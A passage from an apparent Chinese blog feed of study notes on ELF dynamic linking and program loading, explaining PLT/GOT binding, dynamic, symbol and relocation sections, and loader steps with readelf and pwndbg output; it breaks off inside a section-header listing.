<h1 id="关于PLT"><a href="#关于PLT" class="headerlink" title="关于PLT"></a>关于PLT</h1><p>所谓延迟绑定，就是当函数第一次使用时才进行重定位操作（符号绑定），也就是说PIC代码不直接指向got.plt表，而是指向plt表，在第一次调用时，先进行dl-resolve函数操作，之后进行符号绑定。但是貌似好多已经优化掉了，这一步感觉好多elf已经不存在了，就直接跳到got表，程序执行的时候就进行装载。。。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">默认选项编译的代码，还没有执行的printf，可以看到plt中已经不会蹦到dl-resolve代码上去了，直接跳到了got表。。。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">pwndbg&gt; disassemble <span class="number">0x555555555050</span>,+<span class="number">30</span></span><br><span class="line">Dump of assembler code from <span class="number">0x555555555050</span> to <span class="number">0x55555555506e</span>:</span><br><span class="line">   <span class="number">0x0000555555555050</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">0</span>&gt;:   endbr64 </span><br><span class="line">   <span class="number">0x0000555555555054</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">4</span>&gt;:   bnd jmp QWORD PTR [rip+<span class="number">0x2f75</span>]        # <span class="number">0x555555557fd0</span> &lt;<span class="built_in">printf</span>@got.plt&gt;</span><br><span class="line">   <span class="number">0x000055555555505b</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">11</span>&gt;:  nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000555555555060</span> &lt;_start+<span class="number">0</span>&gt;:       endbr64 </span><br><span class="line">   <span class="number">0x0000555555555064</span> &lt;_start+<span class="number">4</span>&gt;:       xor    ebp,ebp</span><br><span class="line">   <span class="number">0x0000555555555066</span> &lt;_start+<span class="number">6</span>&gt;:       mov    r9,rdx</span><br><span class="line">   <span class="number">0x0000555555555069</span> &lt;_start+<span class="number">9</span>&gt;:       pop    rsi</span><br><span class="line">   <span class="number">0x000055555555506a</span> &lt;_start+<span class="number">10</span>&gt;:      mov    rdx,rsp</span><br><span class="line">   <span class="number">0x000055555555506d</span> &lt;_start+<span class="number">13</span>&gt;:      and    rsp,<span class="number">0xfffffffffffffff0</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x555555557fd0</span></span><br><span class="line"><span class="number">0x555555557fd0</span> &lt;<span class="built_in">printf</span>@got.plt&gt;:        <span class="number">0x00007ffff7de96f0</span>      <span class="number">0x00007ffff7db2dc0</span></span><br><span class="line"><span class="number">0x555555557fe0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555557ff0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffff7dce9a0</span></span><br><span class="line"><span class="number">0x555555558000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000555555558008</span></span><br><span class="line"><span class="number">0x555555558010</span> &lt;completed<span class="number">.0</span>&gt;:   <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558050</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558060</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h1 id="ELF文件相关"><a href="#ELF文件相关" class="headerlink" title="ELF文件相关"></a>ELF文件相关</h1><blockquote>
<p>在了解了动态链接的基本思想之后，再来从ELF文件的角度细节理解一下</p>
<p>总体概览是：1.读取program_header，os来分配页表映射关系；（和静态链接一样）</p>
<p>2.同样加载动态链接器，os将控制权交给动态链接器</p>
<p>3.动态链接器经过一些列操作，如bootstrap等等，对可执行文件进行链接操作，然后将控制权交给可执行文件。</p>
<p>4.程序执行。</p>
</blockquote>
<h2 id="interp节"><a href="#interp节" class="headerlink" title=".interp节"></a>.interp节</h2><blockquote>
<p>描述了动态链接器的存储路径，一个字符数组</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink<span class="meta"># readelf -x 1 hh</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.interp&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000318</span> <span class="number">2f</span>6c6962 <span class="number">36342f</span>6c <span class="number">642</span>d6c69 <span class="number">6e75782</span>d /lib64/ld-linux-</span><br><span class="line">  <span class="number">0x00000328</span> <span class="number">7838362</span>d <span class="number">36342e73</span> <span class="number">6f</span>2e3200          x86<span class="number">-64.</span>so<span class="number">.2</span>.</span><br></pre></td></tr></table></figure>

<h2 id="dynamic节"><a href="#dynamic节" class="headerlink" title=".dynamic节"></a>.dynamic节</h2><blockquote>
<p>和符号表类似，也是一个结构体数组，这大概就是描述一个可执行文件重定位信息的一个集合体。</p>
<p>类似于重定位头，跟节表头差不多</p>
<p>其中有动态符号表的文件偏移。。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*其中元素结构为*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> Elf64_Sxword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>

<h2 id="dynsym节"><a href="#dynsym节" class="headerlink" title=".dynsym节"></a>.dynsym节</h2><blockquote>
<p>结构基本symtab一样，只是把需要动态绑定的拿出来，组成的一张表</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink<span class="meta"># readelf -s hh</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">7</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2<span class="number">.34</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">3</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="关于重定位节"><a href="#关于重定位节" class="headerlink" title="关于重定位节"></a>关于重定位节</h2><blockquote>
<p>好像是一个搬运工的身份，其连接了动态符号表以及got表，通过检索动态符号表来将重定位后的值填入到got或got.plt</p>
<p>rela.dyn和rela.dyn的区分个人理解上比较模糊，貌似是通过重定位的类型来区分的，但是不能确定。</p>
<p>关于重定位类型，常见的有：R_X86_64_RELATIVE，R_X86_64_GLOB_DAT，R_X86_64_JUMP_SLO，R_X86_64_RELATIVE代表基址重置，其余两个貌似可以猜出来要干啥，说实话这两个名字的处理方式是一样的，知识跳的位置不一样罢了，其实基址重置也好理解，就是到最后目标位置的值得是装载地址加上addend。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink# readelf -r pic.so</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.dyn&#x27; at offset 0x458 contains 8 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000003e48  000000000008 R_X86_64_RELATIVE                    1130</span><br><span class="line">000000003e50  000000000008 R_X86_64_RELATIVE                    10f0</span><br><span class="line">000000004028  000000000008 R_X86_64_RELATIVE                    4028</span><br><span class="line">000000003fd8  000200000006 R_X86_64_GLOB_DAT 0000000000000000 b + 0</span><br><span class="line">000000003fe0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize + 0</span><br><span class="line">000000003fe8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0</span><br><span class="line">000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0</span><br><span class="line">000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.plt&#x27; at offset 0x518 contains 2 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000004018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 ext + 0</span><br><span class="line">000000004020  000700000007 R_X86_64_JUMP_SLO 0000000000001139 bar + 0</span><br></pre></td></tr></table></figure>

<h3 id="rela-dyn-and-rela-plt"><a href="#rela-dyn-and-rela-plt" class="headerlink" title=".rela.dyn and .rela.plt"></a>.rela.dyn and .rela.plt</h3><blockquote>
<p>结构都是一样的，都是下面这种类型。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h1 id="runtime辅助信息"><a href="#runtime辅助信息" class="headerlink" title="runtime辅助信息"></a>runtime辅助信息</h1><blockquote>
<p>上面讲的都是比较静态的，也就是还未分配页表等映射信息，当os加载程序之后，会初始化一些进程的堆栈信息，这样os转交给链接器的时候，链接器才能知道如何重定位，也就是说加载器负责将模块中的关键信息加载到进程堆栈，之后会调用解释器来进行重定位操作。	</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*辅助信息数组保存在堆栈*/</span></span><br><span class="line"><span class="comment">/* 这个向量通常仅供程序解释器使用。</span></span><br><span class="line"><span class="comment">   在 ABI 补充定义中通常使用 auxv_t 这个名字。</span></span><br><span class="line"><span class="comment">   这个向量通常不会在标准的 &lt;elf.h&gt; 文件中定义，但定义它也无妨。</span></span><br><span class="line"><span class="comment">   我们重命名它以避免冲突。这些类型的大小由 exec 服务器和程序解释器之间的协议决定，</span></span><br><span class="line"><span class="comment">   所以我们在此并未完全指定它们。*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* 条目类型 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* 整数值 */</span></span><br><span class="line">      <span class="comment">/* 以前我们在这里添加了指针元素。</span></span><br><span class="line"><span class="comment">	 但是，由于在 32 位定义和 64 位平台之间使用时无法工作，</span></span><br><span class="line"><span class="comment">	 我们不能这样做。 */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> a_type;		<span class="comment">/* 条目类型 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint64_t</span> a_val;		<span class="comment">/* 整数值 */</span></span><br><span class="line">      <span class="comment">/* 以前我们在这里添加了指针元素。</span></span><br><span class="line"><span class="comment">	 但是，由于在 32 位定义和 64 位平台之间使用时无法工作，</span></span><br><span class="line"><span class="comment">	 我们不能这样做。 */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf64_auxv_t;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="动态链接步骤"><a href="#动态链接步骤" class="headerlink" title="动态链接步骤"></a>动态链接步骤</h1><blockquote>
<p>数据结构了解之后来了解一下algorithm，没有代码，比较高视角（粗糙）。</p>
</blockquote>
<h2 id="第一步：链接器的自举"><a href="#第一步：链接器的自举" class="headerlink" title="第一步：链接器的自举"></a>第一步：链接器的自举</h2><p>链接器也是可执行文件，但是链接器的符号表的装载，got表的重定位也是需要链接器来完成，但是完成自身这一过程不能使用全局变量以及函数，因此叫做bootstrap，类似于自己生自己，中文叫自举。</p>
<h2 id="第二步：依赖模块的装载"><a href="#第二步：依赖模块的装载" class="headerlink" title="第二步：依赖模块的装载"></a>第二步：依赖模块的装载</h2><p>链接器通过阅读可执行文件的.dynamic等字段，将所有所需的模块分配虚拟内存，然后符号表会被合并为全局符号表，具体算法不是很清楚，但是理论上应该是可行的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此段含有装载时所需要的数据结构</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Dynamic section at offset <span class="number">0x2db8</span> contains <span class="number">28</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x0000000000000001</span> (NEEDED)             Shared library: [./Lib.so]</span><br><span class="line"> <span class="number">0x0000000000000001</span> (NEEDED)             Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x000000000000000c</span> (INIT)               <span class="number">0x1000</span></span><br><span class="line"> <span class="number">0x000000000000000d</span> (FINI)               <span class="number">0x1164</span></span><br><span class="line"> <span class="number">0x0000000000000019</span> (INIT_ARRAY)         <span class="number">0x3da8</span></span><br><span class="line"> <span class="number">0x000000000000001b</span> (INIT_ARRAYSZ)       <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000001a</span> (FINI_ARRAY)         <span class="number">0x3db0</span></span><br><span class="line"> <span class="number">0x000000000000001c</span> (FINI_ARRAYSZ)       <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x000000006ffffef5</span> (GNU_HASH)           <span class="number">0x3b0</span></span><br><span class="line"> <span class="number">0x0000000000000005</span> (STRTAB)             <span class="number">0x480</span></span><br><span class="line"> <span class="number">0x0000000000000006</span> (SYMTAB)             <span class="number">0x3d8</span></span><br><span class="line"> <span class="number">0x000000000000000a</span> (STRSZ)              <span class="number">152</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000000b</span> (SYMENT)             <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000015</span> (DEBUG)              <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000000003</span> (PLTGOT)             <span class="number">0x3fb8</span></span><br><span class="line"> <span class="number">0x0000000000000002</span> (PLTRELSZ)           <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000014</span> (PLTREL)             RELA</span><br><span class="line"> <span class="number">0x0000000000000017</span> (JMPREL)             <span class="number">0x618</span></span><br><span class="line"> <span class="number">0x0000000000000007</span> (RELA)               <span class="number">0x558</span></span><br><span class="line"> <span class="number">0x0000000000000008</span> (RELASZ)             <span class="number">192</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000009</span> (RELAENT)            <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000001e</span> (FLAGS)              BIND_NOW</span><br><span class="line"> <span class="number">0x000000006ffffffb</span> (FLAGS_1)            Flags: NOW PIE</span><br><span class="line"> <span class="number">0x000000006ffffffe</span> (VERNEED)            <span class="number">0x528</span></span><br><span class="line"> <span class="number">0x000000006fffffff</span> (VERNEEDNUM)         <span class="number">1</span></span><br><span class="line"> <span class="number">0x000000006ffffff0</span> (VERSYM)             <span class="number">0x518</span></span><br><span class="line"> <span class="number">0x000000006ffffff9</span> (RELACOUNT)          <span class="number">3</span></span><br><span class="line"> <span class="number">0x0000000000000000</span> (<span class="literal">NULL</span>)               <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>这一部分还涉及到global symbol interpose的问题，就是符号冲突的话，那么第二个加载的符号会被忽略，这也解答了之前非常奇怪的问题，就是为什么模块内函数也要重定位到got表，这就是为了防止外部符号覆盖。</p>
<h2 id="第三步：重定位和初始化"><a href="#第三步：重定位和初始化" class="headerlink" title="第三步：重定位和初始化"></a>第三步：重定位和初始化</h2><p>就是通过重定位段来进行got和got.plt表的装载。重定位之后，若库中有.ini段，那么会执行其中代码，来进行全局对象的构造和初始化，退出时也会执行.fini中的代码，尽心全局对象的销毁操作。在这之后就可以把控制权交给程序入口了。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>程序装载简析</title>
    <url>/2024/08/16/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E7%AE%80%E6%9E%90/</url>
    <content><![CDATA[<p>作为一个高视角的科普吧，动态链接在装载过程中做了非常复杂的操作，还需要深入学习。</p>
<h2 id="关于分段和分页"><a href="#关于分段和分页" class="headerlink" title="关于分段和分页"></a>关于分段和分页</h2><p>核心思想就是虚拟化，如何共用同一块内存，如何实现物理内存的复用，MMU和交换空间的发展使之一步一步成为可能，至于如何进行换页，如何进行映射这是OS该管的事，OS使用MMU提供的接口实现一些列换页算法，如LRU等等，装载器的实现的核心代码也是定义在内核中的，主要分为以下几步：</p>
<p><img src="/img/mypic/load.png" alt="load"></p>
<p>按我的理解就是，根据elf的各个段的大小以及类型等各个字段，来建立虚拟内存和文件系统以及物理内存之间的映射关系（俗称页表）。当然进程管理系统，也应该做事，这里只讨论文件装载。决定装载的映射关系的一个重要的地方就是内部碎片和外部碎片，感觉这两个非常矛盾，需要trade-off。段页式管理，多级页表虽然缓解了外部碎片，但是同样加剧了内部碎片，使本应该不占一个页的段，占据一个页空间。感觉这里面极度需要平衡，至于该如何装载那就是OS的事了。但是装载之前elf也是做了一些工作，可执行文件有一个叫程序头的东西，俗称段表，貌似也可以对装载的过程一窥一二。</p>
<h2 id="program-header"><a href="#program-header" class="headerlink" title="program header"></a>program header</h2><blockquote>
<p>其中描述了各个段的信息，大概就是描述了什么文件偏移该映射到什么地方，但是程序是有pie这个选项的，不知道内核是如何处理的。，可以观察到段表比节表少了好多，段表会将部分节表进行合并导致的。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .interp           PROGBITS         <span class="number">0000000000000318</span>  <span class="number">00000318</span></span><br><span class="line">       <span class="number">000000000000001</span>c  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .note.gnu.pr[...] NOTE             <span class="number">0000000000000338</span>  <span class="number">00000338</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">3</span>] .note.gnu.bu[...] NOTE             <span class="number">0000000000000368</span>  <span class="number">00000368</span></span><br><span class="line">       <span class="number">0000000000000024</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .note.ABI-tag     NOTE             <span class="number">000000000000038</span>c  <span class="number">0000038</span>c</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .gnu.hash         GNU_HASH         <span class="number">00000000000003b</span>0  <span class="number">000003b</span>0</span><br><span class="line">       <span class="number">0000000000000024</span>  <span class="number">0000000000000000</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">6</span>] .dynsym           DYNSYM           <span class="number">00000000000003</span>d8  <span class="number">000003</span>d8</span><br><span class="line">       <span class="number">00000000000000</span>a8  <span class="number">0000000000000018</span>   A       <span class="number">7</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">7</span>] .dynstr           STRTAB           <span class="number">0000000000000480</span>  <span class="number">00000480</span></span><br><span class="line">       <span class="number">000000000000008f</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .gnu.version      VERSYM           <span class="number">0000000000000510</span>  <span class="number">00000510</span></span><br><span class="line">       <span class="number">000000000000000</span>e  <span class="number">0000000000000002</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">2</span></span><br><span class="line">  [ <span class="number">9</span>] .gnu.version_r    VERNEED          <span class="number">0000000000000520</span>  <span class="number">00000520</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000000</span>   A       <span class="number">7</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">10</span>] .rela.dyn         RELA             <span class="number">0000000000000550</span>  <span class="number">00000550</span></span><br><span class="line">       <span class="number">00000000000000</span>c0  <span class="number">0000000000000018</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">11</span>] .rela.plt         RELA             <span class="number">0000000000000610</span>  <span class="number">00000610</span></span><br><span class="line">       <span class="number">0000000000000018</span>  <span class="number">0000000000000018</span>  AI       <span class="number">6</span>    <span class="number">24</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">12</span>] .init             PROGBITS         <span class="number">0000000000001000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">000000000000001b</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">13</span>] .plt              PROGBITS         <span class="number">0000000000001020</span>  <span class="number">00001020</span></span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">14</span>] .plt.got          PROGBITS         <span class="number">0000000000001040</span>  <span class="number">00001040</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">15</span>] .plt.sec          PROGBITS         <span class="number">0000000000001050</span>  <span class="number">00001050</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">16</span>] .text             PROGBITS         <span class="number">0000000000001060</span>  <span class="number">00001060</span></span><br><span class="line">       <span class="number">0000000000000117</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">17</span>] .fini             PROGBITS         <span class="number">0000000000001178</span>  <span class="number">00001178</span></span><br><span class="line">       <span class="number">000000000000000</span>d  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">18</span>] .rodata           PROGBITS         <span class="number">0000000000002000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000007</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">19</span>] .eh_frame_hdr     PROGBITS         <span class="number">0000000000002008</span>  <span class="number">00002008</span></span><br><span class="line">       <span class="number">0000000000000034</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">20</span>] .eh_frame         PROGBITS         <span class="number">0000000000002040</span>  <span class="number">00002040</span></span><br><span class="line">       <span class="number">00000000000000</span>ac  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">21</span>] .init_array       INIT_ARRAY       <span class="number">0000000000003</span>db8  <span class="number">00002</span>db8</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">22</span>] .fini_array       FINI_ARRAY       <span class="number">0000000000003</span>dc0  <span class="number">00002</span>dc0</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">23</span>] .dynamic          DYNAMIC          <span class="number">0000000000003</span>dc8  <span class="number">00002</span>dc8</span><br><span class="line">       <span class="number">00000000000001f</span>0  <span class="number">0000000000000010</span>  WA       <span class="number">7</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">24</span>] .got              PROGBITS         <span class="number">0000000000003f</span>b8  <span class="number">00002f</span>b8</span><br><span class="line">       <span class="number">0000000000000048</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">25</span>] .data             PROGBITS         <span class="number">0000000000004000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS           <span class="number">0000000000004010</span>  <span class="number">00003010</span></span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">27</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003010</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">28</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00003040</span></span><br><span class="line">       <span class="number">0000000000000360</span>  <span class="number">0000000000000018</span>          <span class="number">29</span>    <span class="number">18</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">29</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">000033</span>a0</span><br><span class="line">       <span class="number">00000000000001e0</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">30</span>] 